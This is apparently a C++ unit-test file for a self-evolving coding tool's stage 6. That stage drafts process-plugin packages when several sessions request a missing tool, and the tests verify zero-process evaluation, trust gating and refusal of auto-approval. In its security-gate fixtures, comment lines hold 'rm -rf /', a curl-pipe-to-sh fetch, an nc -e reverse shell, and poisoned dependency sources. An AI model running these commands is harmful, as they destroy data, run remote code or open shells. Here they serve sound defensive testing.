// 自进化闭环阶段 6 单测:代码型候选(process Plugin 草稿)。钉六件事——
//   1. 尺三判据:多场同求一件不存在的工具(registry.unknown_tool 稳定失败)
//      才起草插件草稿;单场偶发、工具已存在、无信号都照旧 Skill-only;
//   2. 草稿形状:plugin.json(manifest v1,process,network 关)+ runner
//      脚手架(未实现占位)+ 依赖清单(零依赖);权限差异与工具 wire 名
//      全进 evolution.json;native 一律不生成;
//   3. 零进程:评测计划只带静态检查(kind 白名单里没有 command),评测账
//      tool_calls 为 0;草稿永不进挂载事务——候选仓四层扫描扫不到,偷运
//      进正经层而未过信任门,code 件连暂存都不进;
//   4. 四类安全夹具全拦:恶意脚本/依赖投毒/路径逃逸/网络越权,发现即
//      error,静态门不过(夹具全是无害的"假装恶意":只写注释与死串);
//   5. approve 明拒:草稿评测完也批不动,指路 Package trust 人工审查线,
//      状态停在 evaluated,store 一枚不落;
//   6. 整包事务先例复用:信任过的包里一件代码组件起不来,整包不挂、
//      零残留——草稿即便被人工补实现过了信任门,坏的也带不进来。

#include <doctest/doctest.h>

#include <algorithm>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <optional>
#include <sstream>
#include <string>
#include <vector>

#include "evolution/coordinator.hpp"
#include "evolution/eval.hpp"
#include "evolution/observation_store.hpp"
#include "package/catalog.hpp"
#include "package/code_mounting.hpp"
#include "package/inventory.hpp"
#include "package/mounting.hpp"
#include "package/trust.hpp"
#include "platform/paths.hpp"
#include "runtime/plugin_contract.hpp"
#include "skills/workflow_recorder.hpp"
#include "tools/registry.hpp"

namespace {

namespace fs = std::filesystem;
using namespace lubancode::evolution;

const fs::path kFixturesRoot = fs::path(LUBANCODE_SOURCE_DIR) / "tests" / "fixtures" / "packages";

#ifdef _WIN32
constexpr const char* kPythonCmd = "python";
#else
constexpr const char* kPythonCmd = "python3";
#endif

class TempDir {
public:
    TempDir() {
        dir_ = fs::temp_directory_path() /
               ("lubancode_evolution_stage6_" + std::to_string(reinterpret_cast<std::uintptr_t>(this)));
        std::error_code ec;
        fs::remove_all(dir_, ec);
        fs::create_directories(dir_, ec);
    }
    ~TempDir() {
        std::error_code ec;
        fs::remove_all(dir_, ec);
    }
    const fs::path& Get() const { return dir_; }

private:
    fs::path dir_;
};

std::optional<std::string> ReadText(const fs::path& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) {
        return std::nullopt;
    }
    std::ostringstream buffer;
    buffer << file.rdbuf();
    return buffer.str();
}

bool WriteText(const fs::path& path, const std::string& content) {
    std::error_code ec;
    fs::create_directories(path.parent_path(), ec);
    std::ofstream file(path, std::ios::binary | std::ios::trunc);
    if (!file.is_open()) {
        return false;
    }
    file << content;
    return file.good();
}

// 一场完整录制:目标口述 + 脚本步 + (可选)一件"想用而不可得"的工具。
// wanted_tool 非空时,在收尾前补一对 tool_call/tool_result:ok=false、
// error_code=registry.unknown_tool——模型想用一件不存在的工具。
struct ScriptedStep {
    std::string tool;
    std::string path;
    bool ok;
};

ClusterTaskMaterial MakeTask(const fs::path& recordings_root, const std::string& name,
                             const std::string& goal, const std::vector<ScriptedStep>& script,
                             const std::string& wanted_tool = std::string(),
                             const nlohmann::json& wanted_input = nlohmann::json::object()) {
    lubancode::skills::RecordingStartInfo info;
    info.name = name;
    info.goal = goal;
    info.acceptance = "产物可解析";
    info.cwd = "D:/nowhere";
    auto recorder = lubancode::skills::WorkflowRecorder::Start(recordings_root, info);
    REQUIRE(recorder.has_value());
    int item = 0;
    for (const ScriptedStep& step : script) {
        const std::string execution = "item-" + std::to_string(++item);
        recorder->RecordToolCall(step.tool, nlohmann::json{{"path", step.path}}, execution,
                                 execution);
        recorder->RecordToolResult(step.tool, !step.ok, step.ok ? "成了" : "没成",
                                   step.ok ? "" : "error", step.ok ? "" : "tool.failed", execution);
    }
    if (!wanted_tool.empty()) {
        const std::string execution = "want-" + std::to_string(++item);
        recorder->RecordToolCall(wanted_tool, wanted_input, execution, execution);
        recorder->RecordToolResult(wanted_tool, true, "不认得这件工具", "error",
                                   kUnknownToolErrorCode, execution);
    }
    CHECK(recorder->Stop("yaml 可解析").has_value());
    ClusterTaskMaterial material;
    material.status.id = recorder->id();
    material.status.name = name;
    material.status.dir = recorder->dir();
    material.status.finished = true;
    material.events = lubancode::skills::ReadRecordingEvents(recorder->dir());
    return material;
}

// 造一只最小候选包(package.yaml + skill),给四类夹具测试当干净底座。
fs::path MakeCleanPackage(const fs::path& package_dir) {
    WriteText(package_dir / "package.yaml",
              "schema: 1\nid: evolve.stage6-fixture\nversion: 0.1.0\nname: stage6\n"
              "description: 夹具底座。\n");
    WriteText(package_dir / "skills" / "stage6-fixture" / "SKILL.md",
              "---\nname: stage6-fixture\ndescription: 夹具底座。\n---\n\n# 底座\n\n查一查。\n");
    return package_dir;
}

// 把夹具包拷进临时层,顺手改写 command 的解释器(与挂载事务册同一口径)。
fs::path CopyFixturePackage(const fs::path& src_root, const fs::path& layer,
                            const std::string& dir_name) {
    const fs::path dst_root = layer / dir_name;
    std::error_code ec;
    fs::create_directories(dst_root, ec);
    for (auto it = fs::recursive_directory_iterator(src_root);
         it != fs::recursive_directory_iterator(); it.increment(ec)) {
        if (ec || !it->is_regular_file()) continue;
        const fs::path rel = it->path().lexically_relative(src_root);
        const fs::path dst = dst_root / rel;
        fs::create_directories(dst.parent_path(), ec);
        const std::string name = it->path().filename().string();
        if (name == "plugin.json" || name == "mcp.yaml") {
            std::string text = ReadText(it->path()).value_or("");
            const std::string from = "\"command\": \"python\"";
            const std::size_t hit = text.find(from);
            if (hit != std::string::npos) {
                text.replace(hit, from.size(), std::string("\"command\": \"") + kPythonCmd + "\"");
            }
            WriteText(dst, text);
        } else {
            fs::copy_file(it->path(), dst, fs::copy_options::overwrite_existing, ec);
        }
    }
    return dst_root;
}

// 夹具包里的 plugin.json 内容(阶段 6 草稿同款形状,干净底座)。
std::string CleanPluginJson(bool network) {
    nlohmann::json manifest;
    manifest["manifest_version"] = 1;
    manifest["id"] = "probe-draft";
    manifest["version"] = "0.1.0";
    manifest["language"] = "python";
    manifest["runtime"] = {{"kind", "process"},
                           {"command", "python"},
                           {"args", nlohmann::json::array({"${plugin_dir}/runner.py"})},
                           {"timeout_ms", 5000}};
    manifest["tools"] = nlohmann::json::array({nlohmann::json{
        {"name", "probe"},
        {"description", "夹具底座工具"},
        {"input_schema",
         {{"type", "object"}, {"properties", nlohmann::json::object()}, {"additionalProperties", false}}}}});
    manifest["permissions"] = {{"network", network},
                               {"env", nlohmann::json::array({"EVOLVE_PROBE_DRAFT_DRY_RUN"})}};
    return manifest.dump(2) + "\n";
}

// 数一枚静态门结果里某类 finding 的条数。
int CountFindings(const StaticGateResult& gate, const std::string& kind) {
    int count = 0;
    for (const ScanFinding& finding : gate.findings) {
        if (finding.kind == kind) {
            ++count;
        }
    }
    return count;
}

}  // namespace

// ---------------------------------------------------------------------------
// 1. 尺三判据(纯函数)
// ---------------------------------------------------------------------------
TEST_CASE("stage6:尺三——多场同求一件不存在的工具才起草;单场/已存在/无信号照旧") {
    TempDir temp;
    const fs::path recordings = temp.Get() / "recordings";
    const std::vector<ScriptedStep> script = {
        {"read_file", "cfg/a.yaml", true},
        {"write_file", "out/a.json", true},
    };

    SUBCASE("两场同求 pdf_extract:过尺三") {
        const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账",
                                               script, "pdf_extract",
                                               nlohmann::json{{"path", "logs/a.jsonl"}, {"max_lines", 50}});
        const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账",
                                               script, "pdf_extract",
                                               nlohmann::json{{"path", "logs/b.jsonl"}, {"max_lines", 50}});
        const CodeCapabilitySignal signal = AssessCodeCapability({a, b});
        CHECK(signal.eligible);
        CHECK(signal.wanted_tool == "pdf_extract");
        CHECK(signal.tasks_wanting == 2);
        CHECK(signal.why_not.empty());
        REQUIRE(signal.inputs_note.size() == 2);
        CHECK(std::find(signal.inputs_note.begin(), signal.inputs_note.end(), "path") !=
              signal.inputs_note.end());
    }

    SUBCASE("单场偶发:不过,why_not 说清") {
        const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账",
                                               script, "pdf_extract");
        const CodeCapabilitySignal signal = AssessCodeCapability({a});
        CHECK_FALSE(signal.eligible);
        CHECK(signal.tasks_wanting == 1);
        REQUIRE_FALSE(signal.why_not.empty());
        CHECK(signal.why_not.front().find(">=2") != std::string::npos);
    }

    SUBCASE("没有 unknown_tool 信号:不过,引 §3.5") {
        const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账", script);
        const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", script);
        const CodeCapabilitySignal signal = AssessCodeCapability({a, b});
        CHECK_FALSE(signal.eligible);
        CHECK(signal.why_not.front().find("3.5") != std::string::npos);
    }

    SUBCASE("想要的工具在别场成功过:现有工具办得了,不过") {
        const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账",
                                               script, "pdf_extract");
        // 乙场里同一件工具名成功了(名字撞上现有工具):不是新能力。
        std::vector<ScriptedStep> with_hit = script;
        with_hit.push_back({"pdf_extract", "logs/b.jsonl", true});
        const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", with_hit,
                                               "pdf_extract");
        const CodeCapabilitySignal signal = AssessCodeCapability({a, b});
        CHECK_FALSE(signal.eligible);
        REQUIRE_FALSE(signal.why_not.empty());
        CHECK(signal.why_not.front().find("成功过") != std::string::npos);
    }
}

// ---------------------------------------------------------------------------
// 2/3. 草稿形状与零进程
// ---------------------------------------------------------------------------
TEST_CASE("stage6:propose 出代码档草稿——形状齐、零进程、native 一律不生成") {
    TempDir temp;
    const fs::path home = temp.Get() / ".lubancode";
    const fs::path recordings = home / "recordings";
    const std::vector<ScriptedStep> script = {
        {"read_file", "cfg/a.yaml", true},
        {"write_file", "out/a.json", true},
    };
    const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账", script,
                                           "jsonl_probe",
                                           nlohmann::json{{"path", "logs/a.jsonl"}, {"max_lines", 50}});
    const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", script,
                                           "jsonl_probe",
                                           nlohmann::json{{"path", "logs/b.jsonl"}, {"max_lines", 50}});
    ObservationStore observations(home / "evolution" / "observations");
    EvolutionCoordinator coordinator(home / "package-candidates", &observations);
    const auto result = coordinator.ProposeFromCluster({a, b});
    REQUIRE(result.has_value());
    REQUIRE(result->shape == "code-draft");
    CHECK(result->code_draft);
    CHECK(result->wanted_tool == "jsonl_probe");

    // ---- 草稿三件落盘,manifest 过原生 parser ----
    const fs::path pkg = result->candidate_dir / "package";
    const fs::path plugin_dir = pkg / "plugins" / "jsonl-probe";
    const auto plugin_json = ReadText(plugin_dir / "plugin.json");
    REQUIRE(plugin_json.has_value());
    const auto parsed_manifest =
        lubancode::runtime::ParsePluginManifest(*plugin_json, plugin_dir);
    REQUIRE(parsed_manifest.has_value());
    CHECK(parsed_manifest->kind == lubancode::runtime::RuntimeKind::Process);
    CHECK_FALSE(parsed_manifest->network_allowed);
    REQUIRE(parsed_manifest->tools.size() == 1);
    CHECK(parsed_manifest->tools[0].name == "jsonl_probe");
    CHECK(parsed_manifest->tools[0].input_schema.value("properties", nlohmann::json::object())
              .contains("path"));
    CHECK(parsed_manifest->tools[0].input_schema.value("required", nlohmann::json::array()).size() ==
          2);  // path 与 max_lines 各场都在

    const auto runner = ReadText(plugin_dir / "runner.py");
    REQUIRE(runner.has_value());
    CHECK(runner->find("draft-not-implemented") != std::string::npos);  // 诚实的未实现占位
    // native 铁律:全套草稿里一个 native-library 都不许出现。
    CHECK(plugin_json->find("native-library") == std::string::npos);
    CHECK(runner->find("native-library") == std::string::npos);
    const auto requirements = ReadText(plugin_dir / "requirements.txt");
    REQUIRE(requirements.has_value());
    CHECK(CountFindings(RunStaticGate(pkg), "dependency-poisoning") == 0);  // 零依赖

    // ---- 演化账:权限差异与工具 wire 名单列 ----
    const auto record_text = ReadText(result->candidate_dir / "evolution.json");
    REQUIRE(record_text.has_value());
    const auto record = ParseEvolutionRecord(*record_text);
    REQUIRE(record.has_value());
    CHECK(record->generator.prompt_revision == "evolution-stage6");
    REQUIRE(record->changes.permissions_added.size() >= 2);
    CHECK(std::find(record->changes.permissions_added.begin(),
                    record->changes.permissions_added.end(),
                    "process:python") != record->changes.permissions_added.end());
    CHECK(std::find(record->changes.permissions_added.begin(),
                    record->changes.permissions_added.end(),
                    "env:EVOLVE_JSONL_PROBE_DRY_RUN") != record->changes.permissions_added.end());
    CHECK(std::find(record->changes.permissions_added.begin(),
                    record->changes.permissions_added.end(),
                    "fs_read:workspace") != record->changes.permissions_added.end());
    REQUIRE(record->changes.tools_added.size() == 1);
    // wire 名的点号按契约 %2E 编码:plugin__evolve%2Ejsonl%2Ejsonl-probe__jsonl_probe。
    CHECK(record->changes.tools_added[0].rfind("plugin__evolve", 0) == 0);
    CHECK(record->changes.tools_added[0].find("%2Ejsonl-probe__jsonl_probe") != std::string::npos);

    // 批准账如实落档:process 档,不冒充 content-only。
    const auto approval = ParseApprovalRecord(ReadText(result->candidate_dir / "approval.json").value_or(""));
    REQUIRE(approval.has_value());
    CHECK(approval->tier == "process-plugin-or-mcp");

    // ---- 零进程:评测计划的 kind 白名单里没有 command;评测账 tool_calls 为 0 ----
    const auto plan_text = ReadText(result->candidate_dir / "eval-plan.json");
    REQUIRE(plan_text.has_value());
    const auto plan = ParseEvalPlan(*plan_text);
    REQUIRE(plan.has_value());
    REQUIRE(plan->replay.size() == 1);
    bool any_command = false;
    for (const AcceptanceCheck& check : plan->replay.front().acceptance) {
        any_command = any_command || check.kind == AcceptanceCheckKind::Command;
    }
    CHECK_FALSE(any_command);  // 草稿永不执行:评测只有静态检查与人工验收

    const auto tested = coordinator.Test(result->candidate_id);
    REQUIRE(tested.has_value());
    CHECK(tested->static_gate.pass());  // 干净草稿过静态门
    REQUIRE(tested->state_after == "evaluated");
    CHECK(tested->run_summary.tool_calls.candidate == 0.0);  // 一起进程都没有(指标口径只数真进程)
    REQUIRE(tested->run_summary.complexity.has_value());
    CHECK(tested->run_summary.complexity->shape == "code-draft");
    CHECK(tested->run_summary.complexity->has_plugin);
    CHECK(tested->run_summary.complexity->components >= 2);  // skill + 插件草稿

    // diff 如实亮草稿与权限差异。
    const auto diff = coordinator.Diff(result->candidate_id);
    REQUIRE(diff.has_value());
    CHECK(diff->shape == "code-draft");
    CHECK(diff->plugin_summary.find("process") != std::string::npos);
    CHECK(diff->plugin_summary.find("网络 关") != std::string::npos);
    REQUIRE_FALSE(diff->permission_lines.empty());
    CHECK(diff->permission_lines.front().find("新工具") != std::string::npos);
}

// ---------------------------------------------------------------------------
// 3(续). 草稿不进挂载:候选仓四层扫描扫不到;偷运进正经层而未过信任门,
// code 件连暂存都不进(信任门语义,挂载事务压根不接手)。
// ---------------------------------------------------------------------------
TEST_CASE("stage6:草稿零挂载——候选仓扫不到;未过信任门,code 件连暂存都不进") {
    TempDir temp;
    const fs::path home = temp.Get() / ".lubancode";
    const fs::path recordings = home / "recordings";
    const std::vector<ScriptedStep> script = {
        {"read_file", "cfg/a.yaml", true},
        {"write_file", "out/a.json", true},
    };
    const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账", script,
                                           "jsonl_probe", nlohmann::json{{"path", "logs/a.jsonl"}});
    const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", script,
                                           "jsonl_probe", nlohmann::json{{"path", "logs/b.jsonl"}});
    ObservationStore observations(home / "evolution" / "observations");
    EvolutionCoordinator coordinator(home / "package-candidates", &observations);
    const auto result = coordinator.ProposeFromCluster({a, b});
    REQUIRE(result.has_value());

    // 四层扫描全指向正经目录:候选仓一只都扫不到。
    lubancode::package::ScanOptions options;
    options.user_root = home / "packages";
    options.project_root = temp.Get() / "project" / ".lubancode" / "packages";
    CHECK(lubancode::package::ScanPackages(options).empty());

    // 反证:把草稿偷运进 dev 层扫得着(user 层按契约 §9.2 免审,不拿它试)——
    // 但它带着 code 组件,信任账空着,code_trust 进不了 Trusted,挂载事务
    // 压根不接手(零进程)。
    const fs::path dev_layer = temp.Get() / "dev-packages";
    const fs::path smuggle = dev_layer / "smuggled";
    fs::create_directories(smuggle.parent_path());
    std::error_code ec;
    fs::copy(result->candidate_dir / "package", smuggle, fs::copy_options::recursive, ec);
    lubancode::package::ScanOptions dev_options;
    dev_options.dev_roots.push_back(dev_layer);
    const auto scanned = lubancode::package::ScanPackages(dev_options);
    REQUIRE(scanned.size() == 1);

    lubancode::package::PackageMountInput input;
    input.scan = dev_options;  // trust 快照缺省 = 谁都没批
    const lubancode::package::PackageMount mount = lubancode::package::BuildPackageMount(input);
    REQUIRE(mount.entries.size() == 1);
    CHECK(mount.entries[0].code_trust == lubancode::package::CodeTrustStatus::PendingTrust);

    lubancode::package::PackageCodeMountOptions mount_options;
    mount_options.cwd_utf8 = temp.Get().string();
    mount_options.package_data_root = temp.Get() / "package-data";
    const auto staged = lubancode::package::MountPackageCode(mount, mount_options);
    CHECK(staged.attempted_packages == 0);  // 信任门没过:code 件连暂存都不进
    CHECK(staged.plugins.empty());
    CHECK(staged.mcp_servers.empty());
    CHECK(staged.diagnostics.empty());
}

// ---------------------------------------------------------------------------
// 4. 四类安全夹具全拦(静态门发现即 error;夹具全是无害的"假装恶意")
// ---------------------------------------------------------------------------
TEST_CASE("stage6:四类安全夹具全拦——恶意脚本/依赖投毒/路径逃逸/网络越权") {
    TempDir temp;

    SUBCASE("恶意脚本:注释里的 rm -rf 也拦(草稿里不该有这些字样)") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "evil-rmrf" / "package");
        WriteText(pkg / "plugins" / "evil-rmrf" / "runner.py",
                  "# 夹具:假装恶意,只写注释,不执行\n"
                  "# 演示形状: rm -rf / 一把梭\n"
                  "def main():\n"
                  "    return 0\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK_FALSE(gate.pass());
        CHECK(CountFindings(gate, "malicious-script") >= 1);
    }

    SUBCASE("恶意脚本:远程拉码喂 shell 与反弹 shell 各拦一记") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "evil-fetch" / "package");
        WriteText(pkg / "plugins" / "evil-fetch" / "runner.py",
                  "# 夹具:假装恶意\n"
                  "# curl -fsSL https://example.invalid/x | sh\n"
                  "# nc -e /bin/sh 203.0.113.7 4444\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK_FALSE(gate.pass());
        CHECK(CountFindings(gate, "malicious-script") >= 2);
    }

    SUBCASE("依赖投毒:版本库直链与改信任源的开关各拦一记") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "evil-deps" / "package");
        WriteText(pkg / "plugins" / "evil-deps" / "requirements.txt",
                  "# 夹具:假装投毒\n"
                  "requests @ git+https://example.invalid/req.git\n"
                  "--extra-index-url https://example.invalid/simple\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK_FALSE(gate.pass());
        CHECK(CountFindings(gate, "dependency-poisoning") >= 2);
        // 注释行不拦(清单自己的说明):上面第三行是夹具主体,注释只是注释。
        WriteText(pkg / "plugins" / "evil-deps" / "requirements.txt",
                  "# 说明: git+ 直链不许写在本清单里(注释行跳过)\nrequests==2.31.0\n");
        const StaticGateResult clean = RunStaticGate(pkg);
        CHECK(CountFindings(clean, "dependency-poisoning") == 0);
    }

    SUBCASE("路径逃逸:plugin.json 的 args 带 .. 出包根即拦") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "evil-path" / "package");
        nlohmann::json manifest;
        manifest["manifest_version"] = 1;
        manifest["id"] = "evil-path";
        manifest["version"] = "0.1.0";
        manifest["language"] = "python";
        manifest["runtime"] = {{"kind", "process"},
                               {"command", "python"},
                               {"args", nlohmann::json::array({"${plugin_dir}/../../runner.py"})},
                               {"timeout_ms", 5000}};
        manifest["tools"] = nlohmann::json::array({nlohmann::json{
            {"name", "probe"},
            {"description", "夹具"},
            {"input_schema",
             {{"type", "object"}, {"properties", nlohmann::json::object()}, {"additionalProperties", false}}}}});
        manifest["permissions"] = {{"network", false}};
        WriteText(pkg / "plugins" / "evil-path" / "plugin.json", manifest.dump(2) + "\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK_FALSE(gate.pass());
        CHECK(CountFindings(gate, "path-escape") >= 1);
        // 省略号与正文两个点不冤枉:SKILL 里的 .. 不出发现,plugin.json 那行照报。
        WriteText(pkg / "skills" / "stage6-fixture" / "SKILL.md",
                  "---\nname: stage6-fixture\ndescription: 夹具底座。\n---\n\n# 底座\n\n"
                  "再等等…… 见下文..\n");
        int skill_escapes = 0;
        int manifest_escapes = 0;
        for (const ScanFinding& finding : RunStaticGate(pkg).findings) {
            if (finding.kind != "path-escape") {
                continue;
            }
            if (finding.path.find("SKILL.md") != std::string::npos) {
                ++skill_escapes;
            } else {
                ++manifest_escapes;
            }
        }
        CHECK(skill_escapes == 0);
        CHECK(manifest_escapes >= 1);
    }

    SUBCASE("网络越权:清单未许而代码用网;布尔放行也算宽授权") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "evil-net" / "package");
        WriteText(pkg / "plugins" / "probe-draft" / "plugin.json", CleanPluginJson(false));
        WriteText(pkg / "plugins" / "probe-draft" / "runner.py",
                  "# 夹具:代码想用网,清单却写着关\n"
                  "import urllib.request\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK_FALSE(gate.pass());
        CHECK(CountFindings(gate, "network-overreach") >= 1);

        // 布尔放行(network: true)本身即宽授权;代码不用网也拦。
        const fs::path broad = MakeCleanPackage(temp.Get() / "broad-net" / "package");
        WriteText(broad / "plugins" / "probe-draft" / "plugin.json", CleanPluginJson(true));
        const StaticGateResult broad_gate = RunStaticGate(broad);
        CHECK_FALSE(broad_gate.pass());
        CHECK(CountFindings(broad_gate, "network-overreach") >= 1);
    }

    SUBCASE("干净草稿(阶段 6 真产物)四类零发现") {
        const fs::path pkg = MakeCleanPackage(temp.Get() / "clean-draft" / "package");
        WriteText(pkg / "plugins" / "probe-draft" / "plugin.json", CleanPluginJson(false));
        WriteText(pkg / "plugins" / "probe-draft" / "runner.py",
                  "# 草稿脚手架:读一份 JSON 请求,答一句未实现\n"
                  "import json\nimport sys\n");
        WriteText(pkg / "plugins" / "probe-draft" / "requirements.txt",
                  "# 零依赖\n");
        const StaticGateResult gate = RunStaticGate(pkg);
        CHECK(gate.pass());
        CHECK(gate.findings.empty());
    }
}

// ---------------------------------------------------------------------------
// 5. approve 明拒(阶段 4 语义不动,草稿同门)
// ---------------------------------------------------------------------------
TEST_CASE("stage6:approve 对代码草稿明拒自动晋升,指路 trust;store 一枚不落") {
    TempDir temp;
    const fs::path home = temp.Get() / ".lubancode";
    const fs::path recordings = home / "recordings";
    const std::vector<ScriptedStep> script = {
        {"read_file", "cfg/a.yaml", true},
        {"write_file", "out/a.json", true},
    };
    const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账", script,
                                           "jsonl_probe", nlohmann::json{{"path", "logs/a.jsonl"}});
    const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", script,
                                           "jsonl_probe", nlohmann::json{{"path", "logs/b.jsonl"}});
    ObservationStore observations(home / "evolution" / "observations");
    EvolutionCoordinator coordinator(home / "package-candidates", &observations,
                                     home / "package-store");
    const auto proposed = coordinator.ProposeFromCluster({a, b});
    REQUIRE(proposed.has_value());
    const auto tested = coordinator.Test(proposed->candidate_id);
    REQUIRE(tested.has_value());
    REQUIRE(tested->state_after == "evaluated");

    const auto approved = coordinator.Approve(proposed->candidate_id);
    REQUIRE_FALSE(approved.has_value());
    CHECK(approved.error().find("code-bearing") != std::string::npos);
    CHECK(approved.error().find("trust") != std::string::npos);
    CHECK(approved.error().find("人工审查") != std::string::npos);
    // 状态不动,store 一枚不落。
    CHECK(coordinator.store().Find(proposed->candidate_id)->state == CandidateState::Evaluated);
    CHECK_FALSE(fs::exists(home / "package-store"));
}

// ---------------------------------------------------------------------------
// 冒烟样张:两场同求工具起出的插件草稿长什么样(-s 时整份打印,给人工过目)
// ---------------------------------------------------------------------------
TEST_CASE("stage6:冒烟——代码档草稿样张与零进程口径") {
    TempDir temp;
    const fs::path home = temp.Get() / ".lubancode";
    const fs::path recordings = home / "recordings";
    const std::vector<ScriptedStep> script = {
        {"read_file", "cfg/a.yaml", true},
        {"write_file", "out/a.json", true},
    };
    const ClusterTaskMaterial a = MakeTask(recordings, "jsonl 抽样甲", "抽样核查大账", script,
                                           "jsonl_probe",
                                           nlohmann::json{{"path", "logs/a.jsonl"}, {"max_lines", 50}});
    const ClusterTaskMaterial b = MakeTask(recordings, "jsonl 抽样乙", "抽样核查大账", script,
                                           "jsonl_probe",
                                           nlohmann::json{{"path", "logs/b.jsonl"}, {"max_lines", 50}});
    ObservationStore observations(home / "evolution" / "observations");
    EvolutionCoordinator coordinator(home / "package-candidates", &observations);
    const auto result = coordinator.ProposeFromCluster({a, b});
    REQUIRE(result.has_value());
    REQUIRE(result->shape == "code-draft");

    std::cout << "==== 冒烟:代码档草稿 " << result->candidate_id << " ====\n";
    std::cout << "想要的工具: " << result->wanted_tool << "(簇 " << result->cluster_size
              << " 场同求)\n";
    std::cout << "---- plugins/jsonl-probe/plugin.json ----\n"
              << ReadText(result->candidate_dir / "package" / "plugins" / "jsonl-probe" /
                          "plugin.json")
                     .value_or("(读不出)");
    std::cout << "---- plugins/jsonl-probe/requirements.txt ----\n"
              << ReadText(result->candidate_dir / "package" / "plugins" / "jsonl-probe" /
                          "requirements.txt")
                     .value_or("(读不出)");
    const auto diff = coordinator.Diff(result->candidate_id);
    REQUIRE(diff.has_value());
    std::cout << "---- diff 摘要 ----\n";
    std::cout << "plugin: " << diff->plugin_summary << "\n";
    for (const std::string& line : diff->permission_lines) {
        std::cout << "权限差异: " << line << "\n";
    }
    const auto test = coordinator.Test(result->candidate_id);
    REQUIRE(test.has_value());
    std::cout << "评测: 静态门 " << (test->static_gate.pass() ? "pass" : "fail") << ";tool calls "
              << test->run_summary.tool_calls.candidate << "(零进程;复杂度 "
              << (test->run_summary.complexity.has_value()
                      ? test->run_summary.complexity->SummaryLine()
                      : std::string("(未记)"))
              << ")\n";
    const auto approved = coordinator.Approve(result->candidate_id);
    REQUIRE_FALSE(approved.has_value());
    std::cout << "approve: " << approved.error() << "\n";
}

// ---------------------------------------------------------------------------
// 6. 整包事务先例复用:信任过的包里一件代码组件起不来,整包不挂零残留
// ---------------------------------------------------------------------------
TEST_CASE("stage6:mount-txn 整包事务先例——坏一件代码组件,整包不挂,ToolRegistry 零残留") {
    TempDir temp;
    const fs::path layer = temp.Get() / "dev-packages";
    fs::create_directories(layer);
    CopyFixturePackage(kFixturesRoot / "broken" / "code-failure", layer, "code-failure");

    // 先扫拿哈希,再带全信任快照扫(与挂载事务册 MountTrustedDev 同口径)。
    lubancode::package::PackageMountInput pending_input;
    pending_input.scan.dev_roots.push_back(layer);
    const lubancode::package::PackageMount pending =
        lubancode::package::BuildPackageMount(pending_input);
    lubancode::package::PackageTrustSnapshot trust;
    for (const auto& entry : pending.entries) {
        trust.keys.insert(entry.package_id + "\n" + entry.content_hash);
    }
    lubancode::package::PackageMountInput trusted_input;
    trusted_input.scan.dev_roots.push_back(layer);
    trusted_input.trust = trust;
    const lubancode::package::PackageMount mount = lubancode::package::BuildPackageMount(trusted_input);
    REQUIRE(mount.entries.size() == 1);
    REQUIRE(mount.entries[0].code_trust == lubancode::package::CodeTrustStatus::Trusted);

    lubancode::package::PackageCodeMountOptions options;
    options.cwd_utf8 = temp.Get().string();
    options.package_data_root = temp.Get() / "package-data";
    const lubancode::package::PackageCodeMountResult staged =
        lubancode::package::MountPackageCode(mount, options);

    CHECK(staged.attempted_packages == 1);
    CHECK(staged.plugins.empty());       // 一件坏,整包一件不进
    CHECK(staged.mcp_servers.empty());
    REQUIRE(staged.diagnostics.size() == 1);
    CHECK(staged.diagnostics[0].component_id == "moontide.code-failure:dies-loud");

    // 发布段没有材料可收:正式 ToolRegistry 零残留。
    lubancode::tools::ToolRegistry registry;
    CHECK(registry.Find(lubancode::runtime::BuildPackagedToolWireName(
              "plugin", "moontide.code-failure", "count-words", "count")) == nullptr);
    CHECK(registry.Find(lubancode::runtime::BuildPackagedToolWireName(
              "mcp", "moontide.code-failure", "ledger", "ping")) == nullptr);
}
